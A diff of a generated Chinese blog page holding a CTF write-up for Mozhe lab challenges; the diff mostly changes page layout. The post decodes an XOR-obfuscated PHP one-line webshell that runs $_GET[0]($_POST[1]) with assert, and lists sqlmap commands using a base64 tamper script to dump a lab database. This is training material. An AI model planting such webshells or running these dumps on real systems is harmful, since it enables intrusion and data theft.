@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">709</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">722</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -403,9 +403,9 @@ height:50vh;
 <h2 id="PHP代码分析溯源"><a href="#PHP代码分析溯源" class="headerlink" title="PHP代码分析溯源"></a>PHP代码分析溯源</h2><p>题目地址：<a href="https://www.mozhe.cn/bug/detail/UW5xcFhsWE05akxJYjB1TzEyM2p3UT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/UW5xcFhsWE05akxJYjB1TzEyM2p3UT09bW96aGUmozhe</a></p>
 <p>1、“^”为异或运算符。在PHP中，两个变量进行异或时，会将字符串转换成二进制再进行异或，异或完，又将结果从二进制转换成了字符串。</p>
 <p>2、$<em>++;这行代码的意思是对变量名为”</em>“的变量进行自增操作，在PHP中未定义的变量默认值为null,null==false==0,可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。</p>
-<p>3、$__=(“<code>&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;</code>“).(“{“^”/“);<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="string">"`"</span>^<span class="string">"?"</span>)        <span class="number">01100000</span>^<span class="number">00111111</span>=<span class="number">01011111</span> —&gt;”_”</span><br><span class="line">(<span class="string">":"</span>^<span class="string">"&#125;"</span>)        <span class="number">00111010</span>^<span class="number">01111101</span>=<span class="number">01000111</span>—&gt;”G”</span><br><span class="line">(<span class="string">"%"</span>^<span class="string">"`"</span>)        <span class="number">00100101</span>^<span class="number">01100000</span>=<span class="number">01000101</span>—&gt;”E”</span><br><span class="line">(<span class="string">"&#123;"</span>^<span class="string">"/"</span>)        <span class="number">01111011</span>^ <span class="number">00101111</span>=<span class="number">01010100</span>—&gt;”T”</span><br></pre></td></tr></table></figure></p>
+<p>3、$__=(“<code>&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;</code>“).(“{“^”/“);<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">"`"</span>^<span class="string">"?"</span>)        <span class="number">01100000</span>^<span class="number">00111111</span>=<span class="number">01011111</span> —&gt;”_”</span><br><span class="line">(<span class="string">":"</span>^<span class="string">"&#125;"</span>)        <span class="number">00111010</span>^<span class="number">01111101</span>=<span class="number">01000111</span>—&gt;”G”</span><br><span class="line">(<span class="string">"%"</span>^<span class="string">"`"</span>)        <span class="number">00100101</span>^<span class="number">01100000</span>=<span class="number">01000101</span>—&gt;”E”</span><br><span class="line">(<span class="string">"&#123;"</span>^<span class="string">"/"</span>)        <span class="number">01111011</span>^ <span class="number">00101111</span>=<span class="number">01010100</span>—&gt;”T”</span><br></pre></td></tr></table></figure></p>
 <p>得到$__=_GET</p>
-<p>4、$___=(“$”^”{“).(“~”^”.”).(“/“^”`”).(“-“^”~”).(“(“^”|”);<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="string">"$"</span>^<span class="string">"&#123;"</span>)        <span class="number">00100100</span>^<span class="number">01111011</span>=<span class="number">01011111</span>—&gt;”_”</span><br><span class="line">(<span class="string">"~"</span>^<span class="string">"."</span>)        <span class="number">01111110</span>^<span class="number">00101110</span>=<span class="number">01010000</span>—&gt;”P”</span><br><span class="line">(<span class="string">"/"</span>^<span class="string">"`"</span>)        <span class="number">00101111</span>^<span class="number">01100000</span>=<span class="number">01001111</span>—&gt;”O”</span><br><span class="line">(<span class="string">"-"</span>^<span class="string">"~"</span>)        <span class="number">00101101</span>^<span class="number">01111110</span>=<span class="number">01010011</span>—&gt;”S”</span><br><span class="line">(<span class="string">"("</span>^<span class="string">"|"</span>)        <span class="number">00101000</span>^<span class="number">01111100</span>=<span class="number">01010100</span>—&gt;”T”</span><br></pre></td></tr></table></figure></p>
+<p>4、$___=(“$”^”{“).(“~”^”.”).(“/“^”`”).(“-“^”~”).(“(“^”|”);<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">"$"</span>^<span class="string">"&#123;"</span>)        <span class="number">00100100</span>^<span class="number">01111011</span>=<span class="number">01011111</span>—&gt;”_”</span><br><span class="line">(<span class="string">"~"</span>^<span class="string">"."</span>)        <span class="number">01111110</span>^<span class="number">00101110</span>=<span class="number">01010000</span>—&gt;”P”</span><br><span class="line">(<span class="string">"/"</span>^<span class="string">"`"</span>)        <span class="number">00101111</span>^<span class="number">01100000</span>=<span class="number">01001111</span>—&gt;”O”</span><br><span class="line">(<span class="string">"-"</span>^<span class="string">"~"</span>)        <span class="number">00101101</span>^<span class="number">01111110</span>=<span class="number">01010011</span>—&gt;”S”</span><br><span class="line">(<span class="string">"("</span>^<span class="string">"|"</span>)        <span class="number">00101000</span>^<span class="number">01111100</span>=<span class="number">01010100</span>—&gt;”T”</span><br></pre></td></tr></table></figure></p>
 <p>得到$___=_POST</p>
 <p>5、${$<strong>}[!$<em>](${$</em></strong>}[$_]);<br>得到$_GET<a href="$_POST[1]">0</a>;</p>
 <p>6、构造一句话木马，将“0”当成参数，赋值为“assert”</p>
@@ -422,10 +422,10 @@ height:50vh;
 <p><img src="/2018/07/04/mozhe/1.png" alt="mozhe"></p>
 <h2 id="SQL注入实战MySQL"><a href="#SQL注入实战MySQL" class="headerlink" title="SQL注入实战MySQL"></a>SQL注入实战MySQL</h2><p>题目链接：<a href="https://www.mozhe.cn/bug/detail/MFZ4VjBxRnlIMHBUdGllRDJBMWtRZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/MFZ4VjBxRnlIMHBUdGllRDJBMWtRZz09bW96aGUmozhe</a></p>
 <h3 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h3><p><img src="/2018/07/04/mozhe/2.png" alt="mozhe"></p>
-<h3 id="Sqlmap跑"><a href="#Sqlmap跑" class="headerlink" title="Sqlmap跑"></a>Sqlmap跑</h3><p>1.列出数据库名<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py   <span class="comment">#(.py可加可不加)</span></span><br></pre></td></tr></table></figure></p>
-<p>2.列出test数据库下的表<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test --tables</span><br></pre></td></tr></table></figure></p>
-<p>3.列出表data 下的列即字段<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test -T data --columns</span><br></pre></td></tr></table></figure></p>
-<p>4.爆出字段内容<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test -T data -C <span class="string">"id,main,thkey,title"</span> --dump</span><br></pre></td></tr></table></figure></p>
+<h3 id="Sqlmap跑"><a href="#Sqlmap跑" class="headerlink" title="Sqlmap跑"></a>Sqlmap跑</h3><p>1.列出数据库名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py   <span class="comment">#(.py可加可不加)</span></span><br></pre></td></tr></table></figure></p>
+<p>2.列出test数据库下的表<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test --tables</span><br></pre></td></tr></table></figure></p>
+<p>3.列出表data 下的列即字段<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test -T data --columns</span><br></pre></td></tr></table></figure></p>
+<p>4.爆出字段内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test -T data -C <span class="string">"id,main,thkey,title"</span> --dump</span><br></pre></td></tr></table></figure></p>
 <p>即可得到key.</p>
 
     </article>
@@ -443,8 +443,8 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/04/java环境配置/" title= java环境配置及版本共存问题 >
-                    <div class="nextTitle">java环境配置及版本共存问题</div>
+                <a href= "/2018/07/04/sql注入总结/" title= SQL注入总结 >
+                    <div class="nextTitle">SQL注入总结</div>
                 </a>
             
         </li>
@@ -960,38 +960,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 29
@@ -1004,20 +972,6 @@ top:50vh;
     
     
     
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
@@ -1153,6 +1107,29 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">05/18</span><a class="archive-post-title" href= "/2018/05/18/rsa/" >Crypto_RSA算法总结</a>
         </li>
@@ -1169,9 +1146,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
